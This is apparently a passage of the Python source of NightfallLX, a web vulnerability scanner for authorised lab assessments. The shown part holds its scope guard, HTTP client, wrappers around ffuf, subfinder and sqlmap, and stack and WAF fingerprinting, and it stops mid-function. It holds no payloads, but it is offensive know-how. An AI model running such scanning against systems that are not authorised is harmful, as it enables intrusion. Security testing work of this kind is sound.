#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NightfallLX -- Advanced Web Vulnerability Assessment Framework
==============================================================

A modular, verbose harness for the *detection and validation* phase of an
authorised web assessment, built to pair with the CWES lab workbook.

    nightfalllx -u http://172.17.0.2               # plan only: suggests modules
    nightfalllx -u http://172.17.0.2 --auto        # run only the suggested modules
    nightfalllx -u http://172.17.0.2 --full-scan   # explicit: every module
    nightfalllx -u http://10.129.14.128/app.php?id=1 --modules ssti,sqli,lfi
    nightfalllx -u http://target.lab --modules recon --wordlist common.txt
    nightfalllx -u http://target.lab/api/login --method POST \
        --data 'user=a&pass=b' --modules sqli,xss   # form/JSON body injection
    nightfalllx -u http://target.lab/dashboard --cookie 'session=abc123' \
        -H 'X-Api-Key: ...' --full-scan          # authenticated mode

WHAT THIS TOOL DOES
------------------
1. Fingerprints the stack (server, language, framework, template engine, WAF).
2. Probes each user-controlled input for *evidence* of a class of bug, and only
   reports a finding once the evidence is confirmed against a baseline.
3. Wraps the CLIs you already have (ffuf, subfinder, sqlmap) as subprocesses,
   parses their output, and folds the results into the report. nmap/wafw00f are
   detected and listed in the tool inventory for the operator to use manually.
4. Emits `lab_report.md` + `lab_report.json` with the exact request, the exact
   payload, the raw evidence, and remediation.
5. Injects into query strings, urlencoded forms and JSON bodies (--data /
   --json-body / --param-location).

SCAN MODES
----------
* default      -> fingerprint + a ranked plan of modules. NOTHING is probed.
* --auto       -> runs only the modules the planner selected for this target.
* --modules X  -> runs exactly X (use "all" for every module).
* --full-scan  -> explicit brute-force coverage; never the default.

VECTORS COVERED
---------------
recon/fuzzing, CORS misconfiguration, information exposure, open redirect/CRLF,
SSTI, SQLi, reflected + DOM XSS, command injection, LFI/RFI, XXE, SSRF, GraphQL,
JWT, OAuth/OIDC, IDOR, Host-header injection, login-form enumeration, and
CL.TE/TE.CL request-smuggling timing.

Blind classes (XXE, SSRF, RFI) are confirmed with a built-in callback listener
(--callback-host) rather than guessed from response differences.

DESIGN RULES BAKED INTO THE CODE
--------------------------------
* Every probe is compared against a baseline fetched first, so a soft-404 app
  does not turn into 400 false positives. (This is the single biggest source of
  noise in hand-rolled scanners.)
* Confirmations are differential: a number appearing in a response is only SSTI
  if a *second*, different expression also evaluates. A slow response is only
  command injection if a *longer* sleep takes correspondingly longer.
* Nothing here extracts data, writes files, or guesses credentials. Modules stop
  at "this is exploitable, here is the proof, here is what a human operator
  would run next". Credential attack and data extraction are documented as
  follow-up actions in the report, not automated.
* Scope is enforced mechanically (see ScopeGuard): non-public address space is
  allowed by default, public IPs require --allow-public.
* The default run is a *plan*, not a scan. Modules execute only with --auto,
  --modules or --full-scan, so a stray invocation cannot blanket a target.

Exit codes: 0 = ran to completion (with or without findings)
            2 = refused (out of scope / unreachable / bad args)
"""

from __future__ import annotations

import argparse
import base64
import binascii
import copy
import difflib
import hashlib
import ipaddress
import json
import os
import random
import re
import shutil
import socket
import string
import subprocess
import sys
import threading
import time
import traceback
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import (
    parse_qsl,
    quote,
    unquote_plus,
    urlencode,
    urljoin,
    urlparse,
    urlunparse,
)

# ---------------------------------------------------------------------------
# Dependencies. `requests` is the only hard requirement; colorama and bs4 are
# optional so the tool still runs on a fresh HTB box before you install extras.
# ---------------------------------------------------------------------------
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:  # pragma: no cover
    sys.exit("[!] Missing dependency: pip install requests")

try:
    from colorama import Fore, Style
    from colorama import init as _colorama_init

    _colorama_init(autoreset=False, strip=False, convert=True)
    _HAS_COLOR = True
except ImportError:  # pragma: no cover - degrade to plain output
    _HAS_COLOR = False

    class _Null:
        def __getattr__(self, _name: str) -> str:
            return ""

    Fore = _Null()  # type: ignore[assignment]
    Style = _Null()  # type: ignore[assignment]

try:
    from bs4 import BeautifulSoup

    _HAS_BS4 = True
except ImportError:  # pragma: no cover
    BeautifulSoup = None  # type: ignore[assignment]
    _HAS_BS4 = False


TOOL = "nightfalllx"
VERSION = "1.0.0"
USER_AGENT = f"{TOOL}/{VERSION} (authorised lab assessment)"

# Finding severities, ordered so the report sorts deterministically.
SEVERITY_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

# All probe-able modules, in the order a scan should run them (cheap -> costly).
# `smuggling` is last because it is the only module that speaks raw HTTP and can
# leave a connection in an odd state; nothing after it should depend on the target.
ALL_MODULES = [
    "recon", "cors", "exposure", "redirect", "ssti", "sqli", "xss", "cmdi",
    "lfi", "xxe", "ssrf", "graphql", "jwt", "oauth", "idor", "hostheader",
    "login", "smuggling",
]


# ===========================================================================
# 1. CONSOLE
# ===========================================================================
class Console:
    """
    Thin logging facade. Everything goes to stdout (coloured) and to a run log
    on disk, because a report that says "command injection confirmed" is
    worthless six hours later if you cannot show the transcript that produced it.
    """

    def __init__(self, verbose: bool = True, quiet: bool = False, logfile: Optional[Path] = None):
        self.verbose = verbose
        self.quiet = quiet
        self._fh = None
        if logfile:
            logfile.parent.mkdir(parents=True, exist_ok=True)
            self._fh = logfile.open("a", encoding="utf-8")

    def _emit(self, tag: str, msg: str, colour: str = "") -> None:
        stamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{stamp}] {tag:<5} {msg}"
        if not self.quiet:
            if _HAS_COLOR and colour:
                print(f"{colour}{line}{Style.RESET_ALL}", flush=True)
            else:
                print(line, flush=True)
        if self._fh:
            # Never write ANSI escapes to the log file; it gets parsed by grep.
            self._fh.write(line + "\n")
            self._fh.flush()

    # --- severity-flavoured helpers -------------------------------------
    def banner(self, text: str) -> None:
        if self.quiet:
            return
        bar = "=" * max(len(text) + 4, 60)
        print(f"\n{Fore.CYAN}{bar}\n  {text}\n{bar}{Style.RESET_ALL}", flush=True)

    def head(self, text: str) -> None:
        self._emit("--", text, Fore.CYAN + Style.BRIGHT)

    def info(self, msg: str) -> None:
        self._emit("INFO", msg)

    def debug(self, msg: str) -> None:
        """Chatter that only matters when you are debugging the framework."""
        if self.verbose:
            self._emit("DBG", msg, Fore.MAGENTA)

    def good(self, msg: str) -> None:
        self._emit("OK", msg, Fore.GREEN + Style.BRIGHT)

    def warn(self, msg: str) -> None:
        self._emit("WARN", msg, Fore.YELLOW)

    def err(self, msg: str) -> None:
        self._emit("ERR", msg, Fore.RED)

    def crit(self, msg: str) -> None:
        self._emit("CRIT", msg, Fore.RED + Style.BRIGHT)

    def raw(self, msg: str) -> None:
        if self.verbose:
            self._emit("RAW", msg, Fore.WHITE)

    def close(self) -> None:
        if self._fh:
            self._fh.close()
            self._fh = None


# ===========================================================================
# 2. SCOPE GUARD
# ===========================================================================
class ScopeGuard:
    """
    Refuses public address space unless the operator explicitly says otherwise.

    This exists because the failure mode of an automated web scanner is not
    "it missed a bug" -- it is "it ran against a host nobody authorised". The
    check happens before the first packet leaves the box, on the *resolved*
    address, so a DNS name pointing at a public IP is caught too.
    """

    def __init__(self, console: Console, allow_public: bool = False):
        self.console = console
        self.allow_public = allow_public

    @staticmethod
    def _resolve(host: str) -> List[str]:
        """Return every A/AAAA record for `host` (literal IPs pass straight through)."""
        try:
            ipaddress.ip_address(host)
            return [host]
        except ValueError:
            pass
        try:
            infos = socket.getaddrinfo(host, None)
        except socket.gaierror as exc:
            raise SystemExit(f"[!] Cannot resolve {host!r}: {exc}")
        return sorted({info[4][0] for info in infos})

    def _public_addresses(self, host: str, addresses: Optional[List[str]] = None) -> List[str]:
        public = []
        for addr in (addresses if addresses is not None else self._resolve(host)):
            try:
                ip = ipaddress.ip_address(addr.split("%")[0])
            except ValueError:
                continue
            # is_global is False for RFC1918, loopback, link-local, CGNAT
            # (100.64/10 -- some labs hand these out) and reserved space.
            if ip.is_global:
                public.append(addr)
        return public

    def allows(self, url: str) -> bool:
        """
        Silent scope predicate, used for hosts discovered mid-scan (subdomains,
        callbacks). Unlike check(), it does not print a critical line for every
        candidate it rejects -- those are expected, not operator errors.
        """
        host = urlparse(url).hostname
        if not host:
            return False
        try:
            public = self._public_addresses(host)
        except SystemExit:
            return False
        return self.allow_public or not public

    def check(self, url: str) -> bool:
        host = urlparse(url).hostname
        if not host:
            self.console.err(f"No hostname in target {url!r}")
            return False

        addresses = self._resolve(host)
        public = self._public_addresses(host, addresses)

        if public and not self.allow_public:
            self.console.crit(
                f"{host} resolves to public address(es): {', '.join(public)}. "
                "NightfallLX only scans private/loopback space. If this really is a "
                "host you own, re-run with --allow-public."
            )
            return False

        if public:
            self.console.warn(
                f"--allow-public set; scanning public address(es) {', '.join(public)}. "
                "Confirm your authorisation covers this host."
            )
        else:
            self.console.info(f"Scope OK: {host} -> {', '.join(addresses)} (non-public)")
        return True


# ===========================================================================
# 3. HTTP LAYER
# ===========================================================================
@dataclass
class Resp:
    """
    Immutable snapshot of one HTTP exchange. Modules compare these instead of
    raw `requests.Response` objects so retries, redirects and encoding quirks
    are normalised in exactly one place.
    """

    url: str
    status: int = 0
    elapsed: float = 0.0
    text: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    error: Optional[str] = None

    @property
    def length(self) -> int:
        return len(self.text)

    @property
    def digest(self) -> str:
        """Content hash: the reliable way to tell 'same page' from 'same length'."""
        return hashlib.sha256(self.text.encode("utf-8", "replace")).hexdigest()

    @property
    def ok(self) -> bool:
        return self.error is None and 200 <= self.status < 400

    def snippet(self, needle: Optional[str] = None, width: int = 120) -> str:
        """Pull the region of the body around a match, for the report evidence."""
        if not self.text:
            return ""
        idx = self.text.find(needle) if needle else 0
        if idx < 0:
            idx = 0
        start = max(0, idx - width // 2)
        chunk = self.text[start:start + width * 2]
        return " ".join(chunk.split())


class HttpClient:
    """
    A single session with sane lab defaults: short timeouts, one retry on GET,
    no redirect chasing in the general case (so a 302 to /login is itself
    evidence rather than being silently followed), and a fixed delay between
    requests so a fuzzer cannot knock over a container that runs two workers.
    """

    def __init__(
        self,
        console: Console,
        timeout: float = 10.0,
        delay: float = 0.15,
        proxy: Optional[str] = None,
        verify: bool = True,
        follow: bool = False,
        headers: Optional[Dict[str, str]] = None,
        cookie: Optional[str] = None,
    ):
        self.console = console
        self.timeout = timeout
        self.delay = delay
        self.follow = follow
        # Stored so tools and the report can see what was applied without
        # reaching into the requests session (and so values never get logged).
        self.custom_headers: Dict[str, str] = dict(headers or {})
        self.cookie_names: List[str] = []
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": USER_AGENT,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close",  # keeps some lab proxies from hanging
            }
        )
        # Authenticated mode. Session headers are merged into every request made
        # through this client -- including ones modules build themselves -- which
        # is what makes `--cookie`/`-H` apply across the whole scan.
        if self.custom_headers:
            self.session.headers.update(self.custom_headers)
            self.console.info(
                f"custom headers on every request: {', '.join(self.custom_headers)}"
            )
        if cookie:
            jar = parse_cookie_string(cookie)
            for name, value in jar.items():
                self.session.cookies.set(name, value)
            self.cookie_names = sorted(jar)
            self.console.info(f"cookies loaded into session: {', '.join(self.cookie_names)}")

        # Retry only idempotent verbs, and only on transport errors. Retrying a
        # POST can create duplicate state in the target (bad on a login form).
        retry = Retry(
            total=1,
            connect=1,
            read=0,
            backoff_factor=0.4,
            allowed_methods=frozenset({"GET", "HEAD", "OPTIONS"}),
            status_forcelist=(502, 503, 504),
            raise_on_status=False,
        )
        adapter = HTTPAdapter(max_retries=retry, pool_maxsize=16)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        if proxy:
            self.session.proxies.update({"http": proxy, "https": proxy})
            console.info(f"Routing through proxy {proxy}")
        if not verify:
            self.session.verify = False
            requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
        self.request_count = 0

    # --- session introspection ------------------------------------------
    @property
    def authenticated(self) -> bool:
        """True when the scan is carrying credentials of any kind."""
        return bool(self.cookie_names or self.custom_headers)

    def describe_session(self) -> str:
        """Human-readable summary that names credentials but never prints them."""
        if not self.authenticated:
            return "unauthenticated"
        bits = []
        if self.cookie_names:
            bits.append(f"{len(self.cookie_names)} cookie(s): {', '.join(self.cookie_names)}")
        if self.custom_headers:
            bits.append(f"{len(self.custom_headers)} header(s): {', '.join(self.custom_headers)}")
        return "authenticated with " + "; ".join(bits)

    def request(self, method: str, url: str, **kwargs: Any) -> Resp:
        """Perform one request and normalise the outcome, exceptions included."""
        kwargs.setdefault("allow_redirects", self.follow)
        if self.delay:
            time.sleep(self.delay)
        body_preview = ""
        if kwargs.get("params"):
            body_preview = urlencode(kwargs["params"])
        elif kwargs.get("data") and isinstance(kwargs["data"], dict):
            body_preview = urlencode(kwargs["data"])
        elif kwargs.get("json"):
            body_preview = json.dumps(kwargs["json"])[:200]

        self.console.debug(f"-> {method} {url} {body_preview}"[:400])
        started = time.time()
        try:
            raw = self.session.request(method, url, timeout=self.timeout, **kwargs)
        except requests.RequestException as exc:
            elapsed = time.time() - started
            self.request_count += 1
            self.console.debug(f"<- {type(exc).__name__} after {elapsed:.2f}s")
            return Resp(url=url, elapsed=elapsed, error=f"{type(exc).__name__}: {exc}")
        elapsed = time.time() - started
        self.request_count += 1
        # Accessing .text twice re-decodes a large body; snapshot it once.
        text = raw.text or ""
        resp = Resp(
            url=raw.url,
            status=raw.status_code,
            elapsed=elapsed,
            text=text,
            headers=dict(raw.headers),
        )
        self.console.debug(f"<- {resp.status} {resp.length}B {elapsed:.2f}s")
        if self.console.verbose and resp.text:
            self.console.raw(resp.text[:300].replace("\n", " ")[:300])
        return resp

    def get(self, url: str, **kwargs: Any) -> Resp:
        return self.request("GET", url, **kwargs)

    def post(self, url: str, **kwargs: Any) -> Resp:
        return self.request("POST", url, **kwargs)


# ===========================================================================
# 4. FINDINGS
# ===========================================================================
@dataclass
class Finding:
    """
    One reportable observation. `evidence` is deliberately a short, quotable
    string: a report reviewer should be able to read the finding and the proof
    without having to re-run the scan.
    """

    module: str
    title: str
    severity: str
    endpoint: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    detail: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    next_steps: List[str] = field(default_factory=list)
    request: str = ""

    @property
    def key(self) -> Tuple[str, str, str, str]:
        """Dedup key -- the same bug found twice should not appear twice."""
        return (self.module, self.endpoint, self.parameter, self.title)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class FindingStore:
    def __init__(self, console: Console):
        self.console = console
        self._items: List[Finding] = []
        self._seen: set = set()

    def add(self, finding: Finding) -> None:
        if finding.key in self._seen:
            self.console.debug(f"duplicate finding suppressed: {finding.title}")
            return
        self._seen.add(finding.key)
        self._items.append(finding)
        colour = {
            "CRITICAL": self.console.crit,
            "HIGH": self.console.err,
            "MEDIUM": self.console.warn,
            "LOW": self.console.info,
            "INFO": self.console.info,
        }.get(finding.severity, self.console.info)
        colour(f"[{finding.severity}] {finding.title} @ {finding.endpoint} {finding.parameter}")

    def extend(self, findings: Iterable[Finding]) -> None:
        for f in findings:
            self.add(f)

    def sorted(self) -> List[Finding]:
        return sorted(self._items, key=lambda f: (SEVERITY_RANK.get(f.severity, 9), f.module))

    def count(self, severity: str) -> int:
        return sum(1 for f in self._items if f.severity == severity)

    def __len__(self) -> int:
        return len(self._items)

    def __iter__(self):
        return iter(self._items)


# ===========================================================================
# 5. TOOL ORCHESTRATION
# ===========================================================================
class ToolOrchestrator:
    """
    Wrapper around the external CLIs. Two rules:

      1. A missing tool is never fatal -- `which()` records it and the caller
         degrades to the pure-Python path.
      2. Every subprocess gets a timeout and its stdout/stderr are captured, so
         a hung sqlmap cannot wedge the whole scan.
    """

    def __init__(
        self,
        console: Console,
        timeout: int = 300,
        headers: Optional[Dict[str, str]] = None,
        cookie: Optional[str] = None,
    ):
        self.console = console
        self.timeout = timeout
        # Tool wrappers need the same session material as the HTTP client,
        # otherwise ffuf scans the unauthenticated site and sqlmap tests a
        # parameter that only exists behind login.
        self.headers: Dict[str, str] = dict(headers or {})
        self.cookie = cookie or ""
        self.paths: Dict[str, Optional[str]] = {
            name: shutil.which(name)
            for name in ("ffuf", "subfinder", "sqlmap", "nmap", "wafw00f", "curl", "hydra", "medusa")
        }

    def available(self, name: str) -> bool:
        return bool(self.paths.get(name))

    def _scrub_output_file(self, path: Path) -> None:
        """
        Remove credentials that a tool echoed into its own output file.

        ffuf records the entire command line (and the parsed headers) inside its
        JSON report, so `loot/ffuf_dirs.json` would otherwise contain the session
        cookie in plaintext. We keep the results, we scrub the secrets.
        """
        if not path.exists():
            return
        secrets = [self.cookie] if self.cookie else []
        secrets += [v for k, v in self.headers.items() if SENSITIVE_HEADER_RE.search(k)]
        secrets = [s for s in secrets if s]
        if not secrets:
            return
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            return
        scrubbed = text
        for secret in secrets:
            scrubbed = scrubbed.replace(secret, "<redacted>")
        if scrubbed != text:
            path.write_text(scrubbed, encoding="utf-8")
            self.console.debug(f"scrubbed credentials from {path.name}")

    def inventory(self) -> Dict[str, str]:
        return {k: (v or "not installed") for k, v in self.paths.items()}

    def report_inventory(self) -> None:
        self.console.head("Tool inventory")
        for name, path in self.paths.items():
            if path:
                self.console.good(f"{name:<10} {path}")
            else:
                self.console.warn(f"{name:<10} not installed (module will degrade)")

    def run(self, argv: List[str], timeout: Optional[int] = None, cwd: Optional[Path] = None) -> Tuple[int, str]:
        """
        Execute `argv` and return (returncode, combined output). Never raises for
        a non-zero exit: many tools use exit codes as data.
        """
        timeout = timeout or self.timeout
        self.console.debug(f"exec: {' '.join(redact_argv(argv))}")
        try:
            proc = subprocess.run(
                argv,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=str(cwd) if cwd else None,
                check=False,
            )
        except subprocess.TimeoutExpired:
            self.console.warn(f"{argv[0]} exceeded {timeout}s and was killed")
            return 124, f"[timeout after {timeout}s]"
        except FileNotFoundError:
            self.console.warn(f"{argv[0]} vanished from PATH")
            return 127, "[not found]"
        except Exception as exc:  # pragma: no cover - defensive
            self.console.err(f"{argv[0]} failed to start: {exc}")
            return 1, str(exc)
        out = (proc.stdout or "") + (proc.stderr or "")
        self.console.debug(f"{argv[0]} rc={proc.returncode} ({len(out)} bytes output)")
        return proc.returncode, out

    # --- ffuf -----------------------------------------------------------
    def ffuf(self, base_url: str, wordlist: Path, output: Path, mode: str = "dir",
             filter_size: Optional[int] = None, headers: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
        """
        Run ffuf and return parsed results.

        `mode` decides where FUZZ goes: in the path (directory discovery) or in
        the query string (parameter-name discovery). The `-fs` filter is only
        applied when a baseline size is known -- see ReconEngine, which fetches
        a random path first. Filtering on a guessed size is how people end up
        with either 4000 results or zero.
        """
        if not self.available("ffuf"):
            self.console.warn("ffuf not installed; skipping CLI fuzzing")
            return []
        output.parent.mkdir(parents=True, exist_ok=True)
        if mode == "dir":
            # Strip the query string first. Appending /FUZZ to "...?id=1" fuzzes the
            # *value* of id, which returns the same page 1000 times and looks like
            # 1000 findings -- the single most common ffuf mistake there is.
            parts = urlparse(base_url)
            target = urlunparse(parts._replace(query="", fragment="")).rstrip("/") + "/FUZZ"
        else:
            target = base_url + ("&" if "?" in base_url else "?") + "FUZZ=1"
        argv = [
            self.paths["ffuf"], "-u", target, "-w", str(wordlist),
            "-of", "json", "-o", str(output), "-s",
            "-t", "40", "-timeout", "10",
            "-mc", "200,204,301,302,307,401,403,405,500",
        ]
        if filter_size is not None:
            argv += ["-fs", str(filter_size)]
        # Session headers first, then call-specific ones (which win on conflict).
        merged = dict(self.headers)
        merged.update(headers or {})
        for key, value in merged.items():
            argv += ["-H", f"{key}: {value}"]
        if self.cookie:
            argv += ["-b", self.cookie]
        rc, out = self.run(argv, timeout=180)
        if rc != 0 or not output.exists():
            self.console.warn(f"ffuf produced no output file (rc={rc})")
            if out.strip():
                self.console.debug(out.strip()[:500])
            return []
        try:
            data = json.loads(output.read_text(encoding="utf-8", errors="replace"))
        except json.JSONDecodeError:
            self.console.warn("ffuf output was not valid JSON")
            return []
        results = data.get("results", [])
        # The file itself still holds the full command line; strip our secrets
        # before anything (or anyone) reads loot/ after the scan.
        self._scrub_output_file(output)
        self.console.info(f"ffuf ({mode}): {len(results)} result(s)")
        return results

    # --- subfinder ------------------------------------------------------
    def subfinder(self, domain: str) -> List[str]:
        if not self.available("subfinder"):
            self.console.warn("subfinder not installed; skipping subdomain enumeration")
            return []
        rc, out = self.run([self.paths["subfinder"], "-d", domain, "-silent", "-timeout", "30"], timeout=120)
        if rc != 0:
            self.console.warn("subfinder returned non-zero; treating as empty")
            return []
        hosts = sorted({line.strip() for line in out.splitlines() if line.strip()})
        self.console.info(f"subfinder: {len(hosts)} host(s)")
        return hosts

    # --- sqlmap ---------------------------------------------------------
    def sqlmap(self, url: str, outdir: Path, method: str = "GET",
               data: Optional[str] = None) -> Tuple[bool, str]:
        """
        Detection-only sqlmap run.

        Deliberately missing: --dump, --dump-all, --os-shell, --file-read,
        --sql-query. Those turn a finding into data exfiltration; the assessment
        only needs to know *whether* the parameter is injectable and by which
        technique. --batch --smart keeps it from prompting and from chasing
        every heuristic, which is also what keeps a 2-worker lab container alive.
        """
        if not self.available("sqlmap"):
            self.console.warn("sqlmap not installed; skipping")
            return False, ""
        outdir.mkdir(parents=True, exist_ok=True)
        argv = [
            self.paths["sqlmap"], "-u", url,
            "--batch", "--smart",
            "--level=2", "--risk=1",
            "--technique=BE",           # boolean + error only: fastest, least noisy
            "--threads=1",
            "--timeout=10", "--retries=1",
            "--flush-session",
            "--output-dir", str(outdir),
            "--disable-coloring",
        ]
        if data:
            # Body parameters need --data; without it sqlmap tests the URL and
            # confidently reports "not injectable" for a form-only endpoint.
            argv += ["--data", data, "--method", method]
        # Carry the session into sqlmap too, or it tests a login-gated endpoint
        # anonymously and reports "not injectable" with total confidence.
        if self.cookie:
            argv += ["--cookie", self.cookie]
        if self.headers:
            argv += ["--headers", "\n".join(f"{k}: {v}" for k, v in self.headers.items())]
        rc, out = self.run(argv, timeout=420)
        vulnerable = bool(re.search(r"is vulnerable|identified the following injection point", out, re.I))
        if vulnerable:
            self.console.good("sqlmap confirmed an injectable parameter")
        else:
            self.console.info("sqlmap reported no injectable parameter")
        return vulnerable, out


# ===========================================================================
# 6. FINGERPRINTING
# ===========================================================================
class TechFingerprint:
    """
    Passive fingerprint from the first response, plus a couple of active probes
    only where the passive read is ambiguous.

    What we are actually after is the *template engine*, because that decides
    which SSTI syntax is worth sending. Language tells us where to look:
      PHP  -> Twig, Smarty, Blade
      Python -> Jinja2, Mako, Django templates
      Node -> EJS, Pug, Handlebars, Nunjucks
      Java -> Freemarker, Velocity, Thymeleaf, JSP EL
    """

    # (regex, label) applied to headers + body, case-insensitive.
    SIGNATURES: List[Tuple[str, str]] = [
        (r"x-powered-by:\s*php/?([\d.]+)?", "PHP"),
        (r"x-powered-by:\s*express", "Node.js/Express"),
        (r"x-powered-by:\s*asp\.net", "ASP.NET"),
        (r"server:.*(nginx)", "nginx"),
        (r"server:.*(apache)", "Apache"),
        (r"server:.*(gunicorn|uvicorn|werkzeug|waitress|simplehttp|basehttp|python/\d)", "Python WSGI/ASGI"),
        (r"server:.*(microsoft-iis)", "IIS"),
        (r"jsessionid", "Java (Servlet container)"),
        (r"phpsessid", "PHP session"),
        (r"csrftoken", "Django"),
        (r"laravel_session", "Laravel"),
        (r"wp-content|wordpress", "WordPress"),
        (r"drupal", "Drupal"),
        (r"__next_data__|_next/static", "Next.js"),
        (r"ng-version|ng-app", "Angular"),
        (r"data-reactroot|react\.production", "React"),
        (r"csrfmiddlewaretoken", "Django (CSRF form)"),
        (r"jinja2|jinja", "Jinja2 hint"),
        (r"twig", "Twig hint"),
        (r"freemarker", "Freemarker hint"),
        (r"velocity", "Velocity hint"),
        (r"__schema|/graphql(?:[/?#\"'\s]|$)|graphql endpoint", "GraphQL hint"),
    ]

    # WAF tells: header/cookie names and body strings that vendors leave behind.
    WAF_SIGNATURES: List[Tuple[str, str]] = [
        (r"cf-ray|__cfduid|cf-cache-status", "Cloudflare"),
        (r"x-sucuri|sucuri", "Sucuri"),
        (r"x-akamai|akamai", "Akamai"),
        (r"awselb|x-amzn", "AWS ELB/WAF"),
        (r"x-iinfo|incap_ses|visid_incap", "Imperva Incapsula"),
        (r"server:.*cloudfront", "CloudFront"),
        (r"request rejected|access denied.*waf|blocked by", "Generic WAF/ACL"),
    ]

    def __init__(self, console: Console):
        self.console = console
        self.server = ""
        self.language = ""
        self.framework = ""
        self.engine_guess = ""
        self.waf = ""
        self.found: List[str] = []

    def analyse(self, resp: Resp) -> "TechFingerprint":
        self.server = resp.headers.get("Server", "") or resp.headers.get("server", "")
        blob = " ".join(f"{k}: {v}" for k, v in resp.headers.items()).lower() + " " + resp.text[:8000].lower()

        for pattern, label in self.SIGNATURES:
            if re.search(pattern, blob, re.I) and label not in self.found:
                self.found.append(label)

        for pattern, label in self.WAF_SIGNATURES:
            if re.search(pattern, blob, re.I):
                self.waf = label
                break

        # Collapse the raw list into the three fields we report on.
        lang_map = {
            "PHP": "PHP",
            "PHP session": "PHP",
            "Laravel": "PHP",
            "WordPress": "PHP",
            "Drupal": "PHP",
            "Node.js/Express": "Node.js",
            "Next.js": "Node.js",
            "Python WSGI/ASGI": "Python",
            "Django": "Python",
            "Django (CSRF form)": "Python",
            "Java (Servlet container)": "Java",
            "ASP.NET": "ASP.NET",
        }
        for label in self.found:
            if label in lang_map:
                self.language = lang_map[label]
                break

        for label in self.found:
            if label in ("Laravel", "WordPress", "Drupal", "Django", "Next.js", "Angular", "React"):
                self.framework = label
                break

        for label in self.found:
            if label.endswith("hint"):
                self.engine_guess = label.replace(" hint", "")
                break

        self.console.head("Fingerprint")
        self.console.info(f"server:    {self.server or 'unknown'}")
        self.console.info(f"language:  {self.language or 'unknown'}")
        self.console.info(f"framework: {self.framework or 'unknown'}")
        self.console.info(f"engine:    {self.engine_guess or 'not disclosed (SSTI probes will decide)'}")
        if self.waf:
            self.console.warn(f"WAF/edge:  {self.waf}")
        if self.found:
            self.console.info(f"signals:   {', '.join(self.found)}")
        return self

    def as_dict(self) -> Dict[str, str]:
        return {
            "server": self.server or "unknown",
            "language": self.language or "unknown",
            "framework": self.framework or "unknown",
            "template_engine": self.engine_guess or "undetermined",
            "waf": self.waf or "none detected",
            "signals": ", ".join(self.found) or "none",
        }


# ===========================================================================
# 7. REQUEST HELPERS
# ===========================================================================
def set_query_param(url: str, param: str, value: str) -> str:
    """Replace (or append) one query parameter, preserving the rest exactly."""
    parts = urlparse(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    replaced = False
    new_pairs = []
    for key, val in pairs:
        if key == param and not replaced:
            new_pairs.append((key, value))
            replaced = True
        else:
            new_pairs.append((key, val))
    if not replaced:
        new_pairs.append((param, value))
    return urlunparse(parts._replace(query=urlencode(new_pairs, safe="")))


def header_get(resp: Resp, name: str, default: str = "") -> str:
    """Case-insensitive response-header lookup (Resp.headers is a plain dict)."""
    wanted = name.lower()
    for key, value in resp.headers.items():
        if key.lower() == wanted:
            return value or ""
    return default


def set_query_param_raw(url: str, param: str, raw_value: str) -> str:
    """
    Replace a query parameter without re-encoding the value.

    CRLF probes must reach the server as `%0d%0a`, not `%250d%250a`; the normal
    set_query_param() encodes `%` and would neuter the test. Only this module
    uses the raw form, and it never handles credentials.
    """
    parts = urlparse(url)
    chunks = parts.query.split("&") if parts.query else []
    out: List[str] = []
    replaced = False
    for chunk in chunks:
        key = chunk.split("=", 1)[0]
        if unquote_plus(key) == param and not replaced:
            out.append(f"{key}={raw_value}")
            replaced = True
        else:
            out.append(chunk)
    if not replaced:
        out.append(f"{quote(param)}={raw_value}")
    return urlunparse(parts._replace(query="&".join(out)))


ENV_LINE_RE = re.compile(r"^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=")


def env_keys(text: str) -> List[str]:
    """
    Extract variable *names* from a leaked .env file.

    Values are deliberately not returned: a report is a shared artefact, and a
    leaked DB password in the evidence block is its own incident.
    """
    keys: List[str] = []
    for line in text.splitlines()[:200]:
        match = ENV_LINE_RE.match(line)
        if match:
            keys.append(match.group(1))
    return keys


REQUEST_LINE_RE = re.compile(r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s", re.I)


def request_label(description: str) -> str:
    """
    Turn an injection descriptor into a report-ready request line.

    Query injections describe themselves with a bare URL, so prefix GET. Body
    injections already return 'POST <url> [form ...]' from Target.inject; do not
    prefix those twice.
    """
    return description if REQUEST_LINE_RE.match(description) else f"GET {description}"


def parse_header_args(raw: Iterable[str]) -> Dict[str, str]:
    """
    Turn repeated `-H 'Name: Value'` arguments into a dict.

    Validated here rather than deep in the request path: a header with no colon
    would otherwise be silently dropped by requests, and you would spend an hour
    debugging why your authenticated scan is still hitting 401s.
    """
    headers: Dict[str, str] = {}
    for item in raw:
        if ":" not in item:
            raise SystemExit(f"[!] Bad header {item!r}; expected 'Name: Value'")
        name, value = item.split(":", 1)
        name, value = name.strip(), value.strip()
        if not re.match(r"^[A-Za-z0-9!#$%&'*+.^_`|~-]+$", name):
            raise SystemExit(f"[!] Invalid header name {name!r}")
        headers[name] = value
    return headers


def parse_cookie_string(raw: str) -> Dict[str, str]:
    """
    Split a `Cookie:` header value into a dict. Values may legally contain '=',
    so split on the first one only -- splitting naively truncates JWTs and
    base64 session ids, which is a classic silent-auth-failure bug.
    """
    jar: Dict[str, str] = {}
    for chunk in raw.split(";"):
        chunk = chunk.strip()
        if not chunk:
            continue
        if "=" not in chunk:
            jar[chunk] = ""
            continue
        name, value = chunk.split("=", 1)
